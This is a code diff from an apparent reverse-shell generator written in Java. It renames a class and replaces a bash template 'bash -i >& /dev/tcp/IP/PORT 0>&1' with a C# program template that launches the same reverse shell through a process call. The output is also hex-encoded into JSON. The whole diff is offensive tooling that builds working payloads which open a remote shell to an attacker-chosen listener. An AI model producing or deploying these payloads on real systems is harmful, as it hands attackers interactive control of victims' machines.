@@ -2,12 +2,13 @@ package com.iteso.ReverseShellGenerator.Reverse.Shells;
 import com.iteso.ReverseShellGenerator.DEncoder;
 import com.iteso.ReverseShellGenerator.Reverse.Reverse;
 
-public class Bash_i extends Reverse{
+public class C_Bashi extends Reverse {
+
     protected String shellFormat = "";
 
-    public Bash_i(String localIP, int localPort, LISTENER listener, SHELLS shellType){
+    public C_Bashi(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("\n%s -i >& /dev/tcp/%s/%s 0>&1\n", this.getShell(), this.getLocalIP(), this.getLocalPort());
+        shellFormat = String.format("using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"%s\";\n\t  proc.StartInfo.Arguments = \"-c \\\"%s -i >& /dev/tcp/%s/%S 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",this.getShell(), this.getShell(), this.getLocalIP(), this.getLocalPort());
     }
 
     @Override
@@ -24,4 +25,6 @@ public class Bash_i extends Reverse{
                     "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                 "}";
     }
-}
+    
+} 
+    
